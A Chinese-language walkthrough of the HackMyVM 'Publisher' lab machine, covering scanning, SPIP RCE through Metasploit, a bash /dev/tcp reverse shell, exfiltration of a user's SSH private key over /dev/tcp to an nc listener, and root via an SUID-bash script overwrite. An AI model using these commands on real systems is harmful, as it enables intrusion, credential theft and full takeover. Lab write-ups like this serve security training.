# hmv_publisher

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet
**难度**：绿色
**目标 IP**：192.168.205.211
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口，命令如下：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.211
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 11:31 CST
Nmap scan report for 192.168.205.211
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:D4:4E:10 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
```

扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。

---

### **2. Web 服务探测与目录爆破**

对 80 端口感兴趣，访问 Web 页面，发现其是一个静态页面，包含多个锚点。使用 `whatweb` 探测：

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.211/   
http://192.168.205.211/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], Title[Publisher's Pulse: SPIP Insights & Tips]
```

单纯静态页，目录爆破吧。

使用 `gobuster` 进行目录爆破：

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.211/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.211/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/images               (Status: 301) [Size: 319] [--> http://192.168.205.211/images/]
/index.html           (Status: 200) [Size: 8686]
/spip                 (Status: 301) [Size: 317] [--> http://192.168.205.211/spip/]
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 2314636 / 6369165 (36.34%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2319486 / 6369165 (36.42%)
===============================================================
Finished
===============================================================
                                                          
```

爆破结果显示 `/images` 和 `/spip` 目录存在，并且 `/spip/` 看起来是个感兴趣的目标。

---

### **3. 利用 SPIP 远程代码执行漏洞**

访问 `http://192.168.205.211/spip/`

![image](https://github.com/user-attachments/assets/9846af83-d63f-4888-9de4-c9607030cbd3)

使用 `whatweb` 探测

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.211/spip/   
http://192.168.205.211/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.205.211], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.205.211/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]

```

使用 `searchsploit` 查找相关的漏洞利用脚本：

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit SPIP 4.2.0                                                                                  
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)                                                | php/webapps/51536.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                      
```

找到一个远程代码执行漏洞 (`SPIP v4.2.0 - Remote Code Execution (Unauthenticated)`),利用一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ python3 51536.py 
usage: 51536.py [-h] -u URL -c COMMAND [-v]
51536.py: error: the following arguments are required: -u/--url, -c/--command
                                                                                                                                 
┌──(kali㉿kali)-[~/test]
└─$ python3 51536.py -u http://192.168.205.211/spip/ -c id
Traceback (most recent call last):
  File "/home/kali/test/51536.py", line 63, in <module>
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: module 'urllib3.util.ssl_' has no attribute 'DEFAULT_CIPHERS'
```

报错，换 Metasploit 利用该漏洞：

```bash
msfconsole
msf6 > search SPIP 4.2

Matching Modules
================

   #   Name                                             Disclosure Date  Rank       Check  Description
   -   ----                                             ---------------  ----       -----  -----------
   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
   1     \_ target: PHP In-Memory                       .                .          .      .
   2     \_ target: Unix/Linux Command Shell            .                .          .      .
   3     \_ target: Windows Command Shell               .                .          .      .
   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin
   5     \_ target: PHP In-Memory                       .                .          .      .
   6     \_ target: Unix/Linux Command Shell            .                .          .      .
   7     \_ target: Windows Command Shell               .                .          .      .
   8   exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection
   9     \_ target: PHP In-Memory                       .                .          .      .
   10    \_ target: Unix/Linux Command Shell            .                .          .      .
   11    \_ target: Windows Command Shell               .                .          .      .


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/http/spip_rce_form
After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/spip_bigup_unauth_rce) > show options 

Module options (exploit/multi/http/spip_bigup_unauth_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FORM_PAGE  Auto             yes       A page with a form.
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.205.141  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/spip_bigup_unauth_rce) > set RHOSTS http://192.168.205.211/spip/
RHOSTS => http://192.168.205.211/spip/
msf6 exploit(multi/http/spip_bigup_unauth_rce) > run

[*] Started reverse TCP handler on 192.168.205.141:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: CKNCtIY6q36vgXbnqHlnO...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (40004 bytes) to 192.168.205.211
[*] Meterpreter session 1 opened (192.168.205.141:4444 -> 192.168.205.211:44672) at 2024-12-29 12:41:44 +0800

meterpreter > shell
Process 52 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功获得 Meterpreter shell

---

### **4. 获得更稳定的 shell**

为了获得更稳定的 shell，创建一个反向 shell 脚本，并上传到目标机器：

```bash
cat a.sh  
bash -i >& /dev/tcp/192.168.205.141/8888 0>&1  
chmod +x a.sh  
bash a.sh
```

获得交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

### **5. 获取** **​**​**​`think`​**​**​** **用户 SSH 密钥**

访问 `/home/` 目录，发现 `think` 用户目录下的 `.ssh` 目录具有读取权限。由于本机没有 SSH 客户端，可以通过 `cat` 将私钥传输回攻击机，并登录到目标机器：

#### 目标机器：

```bash
cat id_rsa > /dev/tcp/192.168.205.141/7777
```

#### 攻击机：

```bash
nc -lvnp 7777 > id_rsa  
chmod 600 id_rsa  
ssh think@192.168.205.211 -i id_rsa
```

成功登录 `think` 用户：

```bash
think@publisher:~$ id  
uid=1000(think) gid=1000(think) groups=1000(think)
```

---

### **6. 使用** **​**​**​`linpeas`​**​**​** **查找提权漏洞**

将 `linpeas.sh` 脚本上传至目标机器：

```bash
think@publisher:~$ curl 192.168.205.141:8000/linpeas.sh -o /home/think/linpeas.sh  
think@publisher:~$ chmod +x linpeas.sh  
think@publisher:~$ bash linpeas.sh
```

在脚本输出中，发现一个未知的二进制文件 `/usr/sbin/run_container`，通过 `strings` 命令进行分析：

```bash
think@publisher:~$ strings /usr/sbin/run_container
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail
execve
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
run_container.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

发现该二进制文件似乎与 `/bin/bash`、`/opt/run_container.sh`，似乎是使用bash运行`/opt/run_container.sh`。但是当我查看`/opt/run_container.sh`时发现我没有`/opt/`目录的访问权限，然后就歇b了，实在做不出来我就去看其他师傅的wp了，看的是`ll104567`和`HGBE`两位师傅的wp,发现当前使用的是`受限外壳`,需要绕过。

---

### **7. 提权为 root**

通过动态链接库生成 `bash` shell 来提权。首先，加载 `bash` 所需的共享库：

```bash
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
```

运行 `/usr/sbin/run_container`让它触发执行`/opt/run_container.sh`，并修改`/opt/run_container.sh`脚本：

```bash
think@publisher:~$ echo '#!/bin/bash' > /opt/run_container.sh
think@publisher:~$ echo 'chmod +s /bin/bash' >> /opt/run_container.sh
think@publisher:~$/usr/sbin/run_container
think@publisher:~$ cat /opt/run_container.sh
#!/bin/bash  
chmod +s /bin/bash  
```

然后使用 `bash -p` 提升权限为 root：

```bash
think@publisher:~$ bash -p  
bash-5.0# id 
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```

---

成功获取 root 权限后，已完全控制目标系统。

### 参考

[HGBE](https://hgbe02.github.io/Hackmyvm/publisher.html)

[ll104567](https://www.bilibili.com/video/BV1TM4m1U7y4/)

[voltage](https://vishal-chandak.medium.com/hackmyvm-publisher-4a5033fce95d)